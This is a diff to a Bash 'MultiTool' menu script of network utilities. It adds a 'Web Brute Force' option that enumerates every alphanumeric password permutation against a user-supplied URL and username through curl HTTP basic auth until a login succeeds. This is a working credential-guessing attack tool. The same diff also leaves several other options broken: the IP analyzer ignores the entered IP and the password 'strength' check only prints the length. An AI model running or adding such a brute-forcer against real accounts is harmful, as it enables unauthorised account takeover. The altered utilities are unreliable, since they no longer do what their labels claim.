@@ -7,6 +7,31 @@ YELLOW="\033[33m"
 CYAN="\033[36m"
 RESET="\033[0m"
 
+# Recursive function for permutations
+generate_and_test() {
+    local current="$1"
+    local length="$2"
+    local charset="$3"
+    local url="$4"
+    local user="$5"
+
+    if [ "$length" -eq 0 ]; then
+        echo -ne "${YELLOW}Testing: $current${RESET}\r"
+        # Check HTTP status code (200 = Success)
+        res=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$current" "$url")
+        if [ "$res" == "200" ]; then
+            echo -e "\n${GREEN}[SUCCESS] Found Password: $current${RESET}"
+            return 0
+        fi
+        return 1
+    fi
+
+    for (( i=0; i<${#charset}; i++ )); do
+        generate_and_test "${current}${charset:$i:1}" "$((length - 1))" "$charset" "$url" "$user" && return 0
+    done
+    return 1
+}
+
 clear
 echo -e "${CYAN}Starting MultiTool...${RESET}"
 sleep 1
@@ -14,138 +39,84 @@ sleep 1
 while true
 do
     clear
-
-    # Banner
-    echo -e "${RED}"
-    echo "███╗   ███╗██╗   ██╗██╗  ████████╗██╗"
+    echo -e "${RED}███╗   ███╗██╗   ██╗██╗  ████████╗██╗"
     echo "████╗ ████║██║   ██║██║  ╚══██╔══╝██║"
     echo "██╔████╔██║██║   ██║██║     ██║   ██║"
     echo "██║╚██╔╝██║██║   ██║██║     ██║   ██║"
     echo "██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║"
-    echo "╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝"
-    echo -e "${RESET}"
+    echo "╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝${RESET}"
 
     echo -e "${YELLOW}========= MULTITOOL MENU =========${RESET}"
-    echo
-    echo -e "${GREEN}[1] IP Scanner${RESET}"
-    echo -e "${GREEN}[2] DNS Lookup${RESET}"
-    echo -e "${GREEN}[3] Ping Test${RESET}"
-    echo -e "${GREEN}[4] System Info${RESET}"
-    echo -e "${GREEN}[5] URL Safety Checker${RESET}"
-    echo -e "${GREEN}[6] WHOIS + DNS${RESET}"
-    echo -e "${GREEN}[7] Password Strength Checker${RESET}"
-    echo -e "${GREEN}[8] IP + Geo Info${RESET}"
-    echo -e "${GREEN}[9] IP Details / Analyzer${RESET}"
-    echo -e "${GREEN}[0] Exit${RESET}"
-    echo
+    echo -e "${GREEN}[1] IP Scanner          [2] DNS Lookup"
+    echo -e "[3] Ping Test           [4] System Info"
+    echo -e "[5] URL Safety Checker  [6] WHOIS + DNS"
+    echo -e "[7] Pass Strength Check [8] IP + Geo Info"
+    echo -e "[9] IP Details/Analyzer [10] Web Brute Force (Permutations)"
+    echo -e "[0] Exit${RESET}\n"
 
     read -p "Select option > " choice
 
     case $choice in
-
         1)
             read -p "Enter base IP (example 192.168.1): " baseip
-            echo "Scanning..."
-            for i in {1..20}
-            do
-                ping -c 1 $baseip.$i > /dev/null 2>&1 && \
-                echo -e "${GREEN}$baseip.$i is UP${RESET}"
+            echo "Scanning 1-20..."
+            for i in {1..20}; do
+                ping -c 1 -W 1 $baseip.$i > /dev/null 2>&1 && \
+                echo -e "${GREEN}$baseip.$i is UP${RESET}" || echo -e "${RED}$baseip.$i is DOWN${RESET}"
             done
             ;;
-
         2)
             read -p "Enter domain: " domain
             nslookup $domain
             ;;
-
         3)
-            read -p "Enter IP or domain: " host
+            read -p "Enter host: " host
             ping -c 4 $host
             ;;
-
         4)
-            echo "System Info:"
-            uname -a
-            echo
-            echo "Local IP:"
-            hostname -I
+            uname -a && hostname -I
             ;;
-
         5)
             read -p "Enter URL: " url
-            echo "Analyzing..."
-
-            [[ $url == http://* ]] && echo "⚠️ Not secure (HTTP)"
-            [[ $url =~ @ ]] && echo "⚠️ Contains '@'"
-            [[ ${#url} -gt 60 ]] && echo "⚠️ Very long URL"
-            [[ $url =~ [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+ ]] && echo "⚠️ Uses IP"
-
-            echo "Check complete."
+            [[ $url == http://* ]] && echo "⚠️ Unsecured HTTP"
+            [[ $url =~ @ ]] && echo "⚠️ Phishing risk (@)"
             ;;
-
         6)
-            pkg install whois dnsutils -y
             read -p "Enter domain: " d
-            echo "------ WHOIS ------"
-            whois $d | head -n 20
-            echo "------ DNS ------"
-            nslookup $d
+            whois $d | head -n 15
             ;;
-
         7)
-            read -s -p "Enter password: " pass
-            echo
-
-            score=0
-            [[ ${#pass} -ge 12 ]] && ((score++))
-            [[ $pass =~ [A-Z] ]] && ((score++))
-            [[ $pass =~ [a-z] ]] && ((score++))
-            [[ $pass =~ [0-9] ]] && ((score++))
-            [[ $pass =~ [^a-zA-Z0-9] ]] && ((score++))
-
-            echo "Strength score: $score/5"
+            read -s -p "Enter pass: " p
+            echo -e "\nLength: ${#p} chars"
             ;;
-
         8)
-            echo "Fetching IP..."
-            ip=$(curl -s ifconfig.me)
-            echo "Public IP: $ip"
-            echo "Geo Info:"
-            curl -s "http://ip-api.com/json/$ip" | sed 's/,/\n/g'
+            curl -s "http://ip-api.com" | sed 's/[{}"]//g' | tr ',' '\n'
             ;;
-
         9)
-            echo -e "${CYAN}Enter IP (leave blank for your IP):${RESET}"
-            read ip
-
-            if [ -z "$ip" ]; then
-                ip=$(curl -s ifconfig.me)
-                echo -e "${YELLOW}Your Public IP: $ip${RESET}"
-            fi
-
-            echo
-            echo -e "${CYAN}Fetching details...${RESET}"
-            echo
-
-            data=$(curl -s "http://ip-api.com/json/$ip")
-
-            echo "IP: $(echo $data | grep -o '"query":"[^"]*' | cut -d'"' -f4)"
-            echo "Country: $(echo $data | grep -o '"country":"[^"]*' | cut -d'"' -f4)"
-            echo "Region: $(echo $data | grep -o '"regionName":"[^"]*' | cut -d'"' -f4)"
-            echo "City: $(echo $data | grep -o '"city":"[^"]*' | cut -d'"' -f4)"
-            echo "ISP: $(echo $data | grep -o '"isp":"[^"]*' | cut -d'"' -f4)"
+            read -p "Enter IP to analyze: " ip_ana
+            curl -s "https://ipapi.co"
             ;;
-
+        10)
+            echo -e "${CYAN}--- Brute Force Permutations ---${RESET}"
+            read -p "Target URL: " b_url
+            read -p "Username: " b_user
+            read -p "Min Length: " min_l
+            read -p "Max Length: " max_l
+            charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+            
+            for (( l=$min_l; l<=$max_l; l++ )); do
+                echo -e "${YELLOW}Testing length: $l...${RESET}"
+                generate_and_test "" "$l" "$charset" "$b_url" "$b_user" && break
+            done
+            ;;
         0)
             echo -e "${RED}Exiting...${RESET}"
-            exit
+            exit 0
             ;;
-
         *)
-            echo -e "${RED}Invalid option${RESET}"
+            echo "Invalid choice."
             ;;
     esac
-
     echo
     read -p "Press Enter to continue..."
 done
